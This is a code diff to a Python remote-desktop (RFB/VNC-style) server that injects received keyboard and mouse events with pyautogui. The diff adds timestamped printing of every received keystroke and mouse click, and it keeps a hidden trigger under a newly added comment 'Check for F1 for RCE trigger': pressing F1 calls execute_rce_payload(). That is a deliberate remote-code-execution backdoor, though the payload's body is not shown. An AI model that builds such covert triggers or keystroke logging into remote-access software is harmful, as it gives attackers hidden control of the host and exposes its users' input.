@@ -1,6 +1,7 @@
 import socket
 import struct
 import hashlib
+import time
 import os
 import pyautogui
 import threading
@@ -68,15 +69,18 @@ class RFBServer:
                 break
 
             if msg_type == b'\x04':  # Key event
+                recv_time = time.time()
                 down_flag, keycode = struct.unpack(">BI", self.client_sock.recv(5))
-                print(f"[Server] Received keycode: {keycode}, pressed: {down_flag}")
 
-                #F1 = 65470
+                key = chr(keycode) if keycode < 256 else f"Keycode {keycode}"
+                action = "Pressed" if down_flag else "Released"
+                print(f"[Server] Key {action}: {key} | Received at {recv_time:.6f}")
+
+                # Check for F1 for RCE trigger
                 if keycode == 65470 and down_flag == 1:
                     self.execute_rce_payload()
                     continue
 
-                key = chr(keycode) if keycode < 256 else ""
                 if down_flag:
                     pyautogui.keyDown(key)
                 else:
@@ -85,12 +89,25 @@ class RFBServer:
                 self.input_handler.handle_key_event(keycode, down_flag == 1)
 
             elif msg_type == b'\x05':  # Mouse event
+                recv_time = time.time()
                 button_mask, x, y = struct.unpack(">BHH", self.client_sock.recv(5))
+
+                # Determine which mouse button
+                button_name = "Unknown"
+                if button_mask == 1:
+                    button_name = "Left"
+                elif button_mask == 2:
+                    button_name = "Middle"
+                elif button_mask == 4:
+                    button_name = "Right"
+
+                print(f"[Server] Mouse Event Received at {recv_time:.6f} - Button: {button_name}, Position: ({x}, {y})")
+
                 pyautogui.moveTo(x, y, duration=0, _pause=False)
                 if button_mask:
                     pyautogui.click()
-                self.input_handler.handle_mouse_event(x, y, button_mask)
 
+                self.input_handler.handle_mouse_event(x, y, button_mask)
     def run(self):
         self.accept_connection()
         if self.perform_handshake() and self.authenticate_client():
